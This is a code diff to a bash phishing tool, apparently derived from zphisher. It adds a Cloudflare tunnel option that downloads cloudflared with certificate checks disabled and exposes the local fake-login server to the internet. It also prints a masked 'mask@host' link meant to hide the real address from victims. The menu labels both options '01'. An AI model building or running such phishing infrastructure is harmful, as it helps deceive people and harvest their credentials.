@@ -1,3 +1,4 @@
+###Credits to htr-tech for finding cloudflared alternative 
 ##ANSI colors
 RED="$(printf '\033[31m')"
 GREEN="$(printf '\033[32m')"
@@ -41,7 +42,10 @@ reset_color() {
 kill_pid() {
 	if [[ `pidof php` ]]; then
 		killall php > /dev/null 2>&1
-	fi	
+	fi
+	if [[ `pidof cloudflared` ]]; then
+		killall cloudflared > /dev/null 2>&1
+	fi
 }
 
 
@@ -106,6 +110,43 @@ dependencies() {
 	fi
 }
 
+## Download Cloudflared
+download_cloudflared() {
+	url="$1"
+	file=`basename $url`
+	if [[ -e "$file" ]]; then
+		rm -rf "$file"
+	fi
+	wget --no-check-certificate "$url" > /dev/null 2>&1
+	if [[ -e "$file" ]]; then
+		mv -f "$file" .server/cloudflared > /dev/null 2>&1
+		chmod +x .server/cloudflared > /dev/null 2>&1
+	else
+		echo -e "\n${RED}[${WHITE}!${RED}]${RED} Error occured, Install Cloudflared manually."
+		{ reset_color; exit 1; }
+	fi
+}
+
+## Install Cloudflared
+install_cloudflared() {
+	if [[ -e ".server/cloudflared" ]]; then
+		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Cloudflared already installed."
+	else
+		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing Cloudflared..."${WHITE}
+		arch=`uname -m`
+		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
+			download_cloudflared 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm'
+		elif [[ "$arch" == *'aarch64'* ]]; then
+			download_cloudflared 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64'
+		elif [[ "$arch" == *'x86_64'* ]]; then
+			download_cloudflared 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64'
+		else
+			download_cloudflared 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386'
+		fi
+	fi
+
+}
+
 msg_exit() {
 	{ clear; banner; echo; }
 	echo -e "${GREENBG}${BLACK} Thank you for using this tool, have a good day.${RESETBG}\n"
@@ -137,8 +178,8 @@ about() {
 }
 
 
-HOST='0.0.0.0'
-PORT='80'
+HOST='127.0.0.1'
+PORT='8080'
 
 setup_site() {
 	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Setting up server..."${WHITE}
@@ -197,17 +238,40 @@ start_localhost() {
 	capture_data
 }
 
+start_cloudflared() { 
+        rm .cld.log > /dev/null 2>&1 &
+	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
+	{ sleep 1; setup_site; }
+	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Cloudflared..."
+
+    if [[ `command -v termux-chroot` ]]; then
+		sleep 2 && termux-chroot ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .cld.log > /dev/null 2>&1 &
+    else
+        sleep 2 && ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .cld.log > /dev/null 2>&1 &
+    fi
+
+	{ sleep 8; clear; banner_small; }
+	
+	cldflr_link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".cld.log")
+	cldflr_link1=${cldflr_link#https://}
+	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}$cldflr_link"
+	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${GREEN}$mask@$cldflr_link1"
+	capture_data
+}
 
 tunnel_menu() {
 	{ clear; banner_small; }
 	cat <<- EOF
 		${RED}[${WHITE}01${RED}]${CYAN} Localhost ${RED}[${CYAN}For Devs${RED}]
+		${RED}[${WHITE}01${RED}]${CYAN} Cloudflared ${RED}[${CYAN}Alt to ngrok${RED}]
 	EOF
 
 	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select a port forwarding service : ${BLUE}"
 
 	if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
 		start_localhost
+	elif [[ "$REPLY" == 2 || "$REPLY" == 02 ]]; then
+		start_cloudflared
 	else
 		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
 		{ sleep 1; tunnel_menu; }
@@ -363,4 +427,5 @@ main_menu() {
 
 kill_pid
 dependencies
+install_cloudflared
 main_menu
